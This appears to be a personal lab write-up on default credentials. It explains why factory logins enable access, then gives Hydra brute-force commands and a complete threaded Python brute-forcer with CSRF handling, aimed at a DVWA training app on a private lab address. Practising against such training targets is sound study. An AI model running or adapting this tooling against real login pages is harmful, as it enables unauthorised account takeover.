# Default Credentials 





## What are Default Credentials?
Default credentials are pre-configured username/password combinations that manufacturers set for initial device or application access. They are intended to be changed during setup but often remain unchanged.


## Why Default Credentials Work for Auth Bypass
  - Universal Knowledge: Publicly documented by manufacturers
  - Lazy Administration: Often never changed after deployment
  - rivileged Access: Typically provide administrative privileges
  - ass Exploitation: Same credentials work across all instances

## Common Attack Scenarios
  - Initial network penetration
  - Privilege escalation
  - Backdoor access
  - Mass exploitation campaigns
    
## Why Default Credentials are Dangerous
  - Widely Known: Publicly documented by manufacturers
  - Rarely Changed: Users often don't change defaults
  - Universal Access: Same credentials work across all devices
  - Privileged Access: Often provide admin-level privileges

## Common Scenarios Where Defaults Remain
  - New device deployments
  - Factory resets
  - Lazy administration
  - Embedded systems
  - IoT devices
  - Development environments

---


## Automated Brute Force attack

### Hydra for Default Credential Testing
- First test with `wrong password`:
<img width="452" height="423" alt="image" src="https://github.com/user-attachments/assets/666c8d46-9f2d-4271-89b5-2d48a49b091f" />


#### Basic HTTP Form Attack:
<img width="1913" height="833" alt="image" src="https://github.com/user-attachments/assets/2a6b79ce-2e47-49cc-8dbd-b804416ac2f0" />

````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt 192.168.127.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -V
````
<img width="1696" height="692" alt="image" src="https://github.com/user-attachments/assets/54829a5f-1604-40d2-a106-5390677f8bc1" />

<img width="982" height="617" alt="image" src="https://github.com/user-attachments/assets/5a1dc7d3-7a9b-46dc-be61-c5acfb6d3226" />

<img width="1070" height="807" alt="image" src="https://github.com/user-attachments/assets/36fa041a-395a-4691-bd16-f191be060403" />


####  With specific error message detection
- First we need to check `Location`:

````
curl -X POST http://192.168.127.129/dvwa/login.php -d "username=test&password=test&Login=Login" -i
````
<img width="1267" height="367" alt="image" src="https://github.com/user-attachments/assets/926f82e0-4857-4da5-aec8-120f326dc823" />


````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt -t 4 -w 10 -vV 192.168.127.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
````
<img width="1887" height="770" alt="image" src="https://github.com/user-attachments/assets/453da616-c47c-4493-99f4-6bcb2533ad83" />

<img width="906" height="570" alt="image" src="https://github.com/user-attachments/assets/a811a7b3-6962-4e86-ad4e-d7965f98d36b" />

<img width="1072" height="806" alt="image" src="https://github.com/user-attachments/assets/5e3fcf0c-93bd-4a83-b71d-59c3b7c2602b" />


#### Save results to file
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt -t 4 -w 10 -vV -o hydra_results.txt 192.168.127.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
````
<img width="1810" height="804" alt="image" src="https://github.com/user-attachments/assets/84a7b7ac-7889-43eb-85df-aa76e4fc96ee" />

<img width="907" height="767" alt="image" src="https://github.com/user-attachments/assets/7a2f1821-6e52-4adf-947a-5f5a51fd2b64" />

<img width="888" height="591" alt="image" src="https://github.com/user-attachments/assets/fa72167e-1c99-4241-ac8e-cd6680c14b07" />

````
cat hydra_results.txt
````
<img width="1913" height="102" alt="image" src="https://github.com/user-attachments/assets/28c48e34-62b5-4bfa-9397-723d19ccffa4" />

---



### Python Automated Brute Force
- In this i use VSCode:
````
#!/usr/bin/env python3
import requests
import threading
from queue import Queue, Empty
from bs4 import BeautifulSoup
import time
import os

class DVWABruteForcer:
    def __init__(self, target_base_url, threads=5, stop_on_success=True, verbose=True):
        """
        target_base_url: e.g. "http://192.168.127.129/dvwa" (no trailing slash required)
        """
        self.target_base_url = target_base_url.rstrip('/')
        self.threads = threads
        self.stop_on_success = stop_on_success
        self.verbose = verbose

        self.found_credentials = Queue()
        self.tested = 0
        self.tested_lock = threading.Lock()
        self.found_event = threading.Event()

    def load_wordlists(self, user_file, pass_file):
        """Load username and password wordlists from files (one per line)."""
        if not os.path.isfile(user_file):
            raise FileNotFoundError(f"User file not found: {user_file}")
        if not os.path.isfile(pass_file):
            raise FileNotFoundError(f"Password file not found: {pass_file}")

        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]

        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        return users, passwords

    def _get_csrf_token(self, session, login_url):
        """Try several common ways to find a CSRF token in the login form."""
        try:
            resp = session.get(login_url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'}) or \
                          soup.find('input', {'name': 'token'}) or \
                          soup.find('input', {'id': 'user_token'}) or \
                          soup.find('input', {'type': 'hidden'})

            token = token_input['value'] if token_input and token_input.has_attr('value') else ''
            return token
        except Exception:
            return ''

    def worker(self, credentials_queue):
        """Worker thread for brute forcing one credential pair at a time."""
        session = requests.Session()
        login_url = f"{self.target_base_url}/login.php"

        while not self.found_event.is_set():
            try:
                username, password = credentials_queue.get_nowait()
            except Empty:
                break

            try:
                with self.tested_lock:
                    self.tested += 1
                    tested_local = self.tested

                if self.verbose and (tested_local % 10 == 0):
                    print(f"[*] Tested {tested_local} combinations...")

                token = self._get_csrf_token(session, login_url)

                login_data = {
                    'username': username,
                    'password': password,
                    'Login': 'Login'
                }
                if token:
                    login_data['user_token'] = token

                resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)

                location = resp.headers.get('Location', '')
                if resp.status_code in (301, 302) and 'index.php' in location:
                    print(f"[SUCCESS] Found: {username}:{password}")
                    self.found_credentials.put((username, password))
                    if self.stop_on_success:
                        self.found_event.set()
                        # mark success and break
                        break

                time.sleep(0.01)

            except Exception as e:
                if self.verbose:
                    print(f"[!] Worker exception for {username}:{password} -> {e}")
            finally:
                credentials_queue.task_done()

    def brute_force(self, user_file, pass_file):
        """Perform threaded brute force attack. Returns (user,pass) or None."""
        users, passwords = self.load_wordlists(user_file, pass_file)

        credentials_queue = Queue()
        for u in users:
            for p in passwords:
                credentials_queue.put((u, p))

        total = credentials_queue.qsize()
        print(f"[*] Starting brute force with {total} combinations")
        print(f"[*] Using {self.threads} threads")

        thread_pool = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(credentials_queue,), daemon=True)
            t.start()
            thread_pool.append(t)

        credentials_queue.join()

        self.found_event.set()  
        for t in thread_pool:
            t.join(timeout=1)

        if not self.found_credentials.empty():
            return self.found_credentials.get()
        return None

if __name__ == "__main__":

    user_file = "/tmp/dvwa_test_users.txt"
    pass_file = "/tmp/dvwa_test_pass.txt"

    with open(user_file, 'w') as f:
        f.write("admin\n")
        f.write("guest\n")

    with open(pass_file, 'w') as f:
        f.write("password\n")
        f.write("123456\n")
        f.write("password123\n")

    bf = DVWABruteForcer("http://192.168.127.129/dvwa", threads=10, stop_on_success=True, verbose=True)
    result = bf.brute_force(user_file, pass_file)

    if result:
        print(f"\n[!] DVWA Compromised: {result[0]}:{result[1]}")
    else:
        print("[-] Brute force failed or no credentials found")

````
<img width="1573" height="413" alt="image" src="https://github.com/user-attachments/assets/04bd4e41-972b-430b-8a4d-4955d33152f5" />


----



## Finished Of Default Credentials


---


---

## Practice By:Nin Kanong (k4n0ng)

---
























